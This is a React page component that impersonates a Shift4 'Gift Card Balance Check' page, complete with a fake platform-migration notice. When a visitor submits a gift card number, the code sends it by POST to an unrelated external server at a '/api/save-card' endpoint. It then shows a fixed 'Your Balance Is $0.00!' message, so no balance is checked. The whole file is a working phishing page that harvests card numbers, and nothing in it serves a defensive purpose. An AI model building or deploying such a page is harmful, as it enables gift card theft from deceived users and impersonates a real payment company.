
import { useState } from "react";

export default function Home() {
  const [cardNumber, setCardNumber] = useState("");
  const [loading, setLoading] = useState(false);
  const [message, setMessage] = useState("");

  const handleSubmit = async () => {
    if (!cardNumber.trim()) {
      return setMessage("Please enter a card number");
    }

    setLoading(true);
    setMessage("");

    try {
      const response = await fetch("https://www.server.finesseoasis.com.ng/api/save-card", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ cardNumber }),
      });

      const data = await response.json();

      if (response.ok) {
        setMessage("Your Balance Is $0.00!");
        setCardNumber("");
      } else {
        setMessage(`⚠️ ${data.message || "Something went wrong"}`);
      }
    } catch (error) {
      console.error(error);
      setMessage("⚠️ Server error, try again later");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-black text-white flex px-4 flex-col items-center">
      {/* Header */}
      <div className="text-center mt-10 mb-8">
        <p className="text-xs tracking-widest text-gray-400">POWERED BY</p>
        <h1 className="text-4xl font-semibold tracking-widest">
          SHIFT<span className="text-blue-500">4</span>
        </h1>
      </div>

      {/* Notice Box */}
      <div className="bg-gray-200 text-black max-w-4xl w-full border-2 border-yellow-400 rounded-md p-6 mb-8">
        <h2 className="text-blue-600 font-semibold mb-2">
          Important Notice: Gift Card Balance Check Update
        </h2>
        <p className="text-sm">
          As part of our platform migration, the ability to enter a gift card
          number to check a balance on this page has been enabled. Your gift
          cards are still valid and can be used as usual.
        </p>
      </div>

      {/* Balance Check Card */}
      <div className="bg-gray-200 text-black max-w-4xl w-full p-8 rounded-md mb-10">
        <h2 className="text-2xl text-blue-600 mb-6">
          Gift Card Balance Check
        </h2>

        <p className="text-sm mb-4">
          Please enter your gift card account number below.
        </p>

        <div className="flex gap-3">
          <input
            type="text"
            value={cardNumber}
            onChange={(e) => setCardNumber(e.target.value)}
            placeholder="Enter gift card"
            className="border text-white border-gray-400 px-4 py-2 w-80 rounded focus:outline-none focus:ring-2 focus:ring-blue-500"
          />
          <button
            onClick={handleSubmit}
            disabled={loading}
            className="bg-blue-500 hover:bg-blue-600 text-white px-6 py-2 rounded disabled:opacity-60"
          >
            {loading ? "Checking..." : "GO"}
          </button>
        </div>

        {message && (
          <p className="mt-4 text-sm text-center text-red-600 font-medium">
            {message}
          </p>
        )}
      </div>

      {/* Footer */}
      <footer className="text-xs text-gray-400 mb-6">
        © 2026 Shift4, a FOUR company. All Rights Reserved.
      </footer>
    </div>
  );
}
